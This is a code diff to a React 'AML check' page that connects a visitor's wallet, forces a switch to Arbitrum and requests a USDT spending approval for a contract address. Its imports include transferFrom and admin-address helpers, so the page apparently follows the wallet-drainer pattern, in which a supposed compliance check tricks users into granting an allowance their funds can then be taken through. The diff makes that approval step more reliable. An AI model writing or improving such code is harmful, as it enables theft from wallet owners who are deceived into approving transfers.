@@ -2,13 +2,37 @@ import React, { useEffect, useMemo, useState } from 'react'
 import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
-import { useAccount, useChainId, useConnect } from 'wagmi'
-import { CHAIN_IDS } from '../web3/config.jsx'
+import { useAccount, useChainId, useConnect, useSwitchChain } from 'wagmi'
+import { CHAIN_IDS, wagmiConfig } from '../web3/config.jsx'
 import { formatUSDTAmount, readAdminAddress, callTransferFromSender, approveUSDT, checkUSDTAllowance } from '../web3/tokenTransfer'
+import { waitForTransactionReceipt } from 'wagmi/actions'
 
 export default function AmlCheck() {
   const { address, isConnected } = useAccount()
   const liveChainId = useChainId()
+  const { switchChain } = useSwitchChain()
+
+  // Auto switch to Arbitrum on connect if wallet is on a different network
+  useEffect(() => {
+    if (!isConnected || !liveChainId) return
+    if (liveChainId !== CHAIN_IDS.arbitrum) {
+      setTxStatus('Switching to Arbitrum…')
+      ;(async () => {
+        try {
+          await switchChain({ chainId: CHAIN_IDS.arbitrum })
+          setTxStatus('Switched to Arbitrum.')
+        } catch (err) {
+          if (err?.code === 4902) {
+            setError('Please add Arbitrum network to your wallet manually')
+          } else {
+            const msg = err?.message || String(err)
+            setError(`Failed to switch to Arbitrum. ${msg}`)
+          }
+          setTxStatus('')
+        }
+      })()
+    }
+  }, [isConnected, liveChainId])
 
   const settings = useMemo(() => {
     try { return JSON.parse(localStorage.getItem('amlsec_settings') || '{}') } catch { return {} }
@@ -83,8 +107,13 @@ export default function AmlCheck() {
       }
       const txHash = await approveUSDT({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
       setTxStatus(`Approval submitted: ${String(txHash)}`)
+      // Wait for on-chain confirmation with Wagmi/Viem
+      await waitForTransactionReceipt(wagmiConfig, { hash: txHash })
+      setTxStatus('Approval confirmed on-chain.')
     } catch (err) {
-      setError(err?.message || 'Approval failed')
+      const msg = typeof err === 'string' ? err : (err?.message || err?.toString?.() || 'Unknown error')
+      const cancelled = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || err?.code === 4001 || err?.name === 'UserRejectedRequestError')
+      setError(cancelled ? 'Request cancelled by user' : msg)
       setTxStatus('')
     }
   }
